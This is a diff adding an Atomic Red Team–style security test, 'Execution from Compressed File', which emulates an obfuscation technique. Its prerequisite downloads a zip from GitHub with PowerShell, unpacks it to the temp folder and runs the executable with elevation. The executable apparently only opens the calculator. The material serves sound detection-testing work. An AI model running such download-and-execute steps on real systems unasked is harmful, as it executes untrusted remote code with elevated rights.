@@ -11278,6 +11278,39 @@ defense-evasion:
           -Name #{registry_entry_storage}
 
 '
+    - name: Execution from Compressed File
+      description: 'Mimic execution of compressed executable. When successfully executed,
+        calculator.exe will open.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_payload:
+          description: EXE to execute
+          type: Path
+          default: "%temp%\\temp_T1027.zip\\T1027.exe"
+        url_path:
+          description: url to download Exe
+          type: url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
+      dependency_executor_name: powershell
+      elevation_required: true
+      dependencies:
+      - description: T1027.exe must exist on disk at specified location
+        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
+          Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\"
+      executor:
+        name: command_prompt
+        command: '"#{exe_payload}"
+
+'
+        cleanup_command: |
+          taskkill /f /im calculator.exe >nul 2>nul
+          rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
+          del /Q "%temp%\T1027.zip" >nul 2>nul
   T1502:
     technique:
       x_mitre_data_sources:
